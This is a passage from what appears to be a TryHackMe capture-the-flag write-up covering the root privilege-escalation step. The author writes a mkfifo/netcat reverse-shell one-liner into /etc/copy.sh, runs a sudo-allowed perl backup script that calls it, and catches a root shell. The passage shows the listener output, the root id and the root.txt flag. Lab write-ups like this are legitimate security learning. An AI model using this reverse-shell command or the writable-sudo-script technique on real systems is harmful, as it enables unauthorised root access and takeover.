<p>I updated the IP address in the copy.sh script with my own (tun0) and modified the script&#39;s contents. Following this, I ran netcat. Upon running the backup.pl script with the sudo command, a new reverse shell was generated with root privileges. I then gained access to read the root.txt flag located in the root directory.&quot;</p>
<pre><code>echo <span class="hljs-string">"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.13.0.39 5554 &gt;/tmp/f"</span> &gt; /etc/<span class="hljs-keyword">copy</span>.<span class="hljs-keyword">sh</span>
<span class="hljs-keyword">cat</span> /etc/<span class="hljs-keyword">copy</span>.<span class="hljs-keyword">sh</span>
<span class="hljs-keyword">rm</span> /tmp/f;mkfifo /tmp/f;<span class="hljs-keyword">cat</span> /tmp/f|/bin/<span class="hljs-keyword">sh</span> -i 2&gt;&amp;1|nc 10.13.0.39 5554 &gt;/tmp/<span class="hljs-built_in">f</span>
sudo /usr/bin/perl /home/itguy/backup.<span class="hljs-keyword">pl</span>
<span class="hljs-keyword">rm</span>: cannot remove '/tmp/f': <span class="hljs-keyword">No</span> such <span class="hljs-keyword">file</span> or directory

nc -nvlp 5554                                            
listening <span class="hljs-keyword">on</span> [any] 5554 ...
connect to [10.13.0.39] from (UNKNOWN) [10.10.198.128] 45002
/bin/<span class="hljs-keyword">sh</span>: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# <span class="hljs-keyword">cd</span> /root
# <span class="hljs-keyword">ls</span>
root.txt
# <span class="hljs-keyword">cat</span> root.txt
THM{6637f41d0177b6f37cb20d775124699f}
</code></pre>
